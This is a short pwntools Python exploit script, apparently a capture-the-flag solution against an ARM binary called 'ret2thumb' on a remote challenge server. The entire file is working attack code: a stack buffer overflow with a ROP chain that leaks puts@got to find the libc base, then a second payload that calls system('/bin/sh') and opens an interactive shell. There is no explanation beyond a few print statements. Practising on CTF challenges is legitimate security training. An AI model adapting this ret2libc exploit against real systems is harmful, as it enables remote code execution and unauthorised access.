from pwn import *
context.log_level = 'debug'
context.arch = 'arm'
e = ELF('./ret2thumb')
libc = ELF('./libc.so.6')
mov_r0_r3 = 0x00010550 
pop_r3_pc = 0x00010388
r = remote('chal.nbctf.com', 30175)
#r = gdb.debug('./ret2thumb', 'b *0x00010508\nc')
#r = process('./ret2thumb')
print('exploit')
r.sendline(b'a'*0x24+p32(pop_r3_pc)+p32(e.got['puts'])+p32(mov_r0_r3)+p32(0)+p32(e.plt['puts'])+b'a'*20+p32(e.sym['vuln']))
r.recvline()
leak = u32(r.recv(4))
print('puts@got =', hex(leak))
libc.address = leak - libc.sym['puts']
print('libc.address =', hex(libc.address))
assert libc.address & 0xfff == 0
r.sendline(b'a'*0x24+p32(pop_r3_pc)+p32(next(libc.search(b'/bin/sh\x00')))+p32(mov_r0_r3)+p32(0)+p32(libc.sym['system']))
r.interactive()

